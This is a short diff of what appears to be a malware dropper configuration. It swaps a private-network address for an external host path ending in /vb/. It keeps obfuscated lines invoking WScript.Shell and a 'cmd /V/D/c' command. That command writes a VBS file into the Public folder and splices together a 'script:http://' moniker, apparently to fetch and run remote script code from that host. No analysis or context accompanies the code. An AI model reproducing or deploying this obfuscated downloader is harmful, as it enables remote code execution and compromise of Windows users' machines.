@@ -1,4 +1,4 @@
-192.168.0.24/vb/
+80.32.109.208.host.secureserver.net/vb/
 W@scr@Ipt.s@hEl@l
 RUN
 cm@d /V/D/c "echo %varC2%="tp":%varC5%="ri">%Public%\%varC7%.v@bs&&echo '%varC8%%varC9%>>%Public%\%varC7%.vbs&&echo %varC1%=".":%varC4%="sC" ^& %varC5% ^& "pt:ht" ^& %varC2% ^& "://">>%Public%\%varC7%.v@bs"
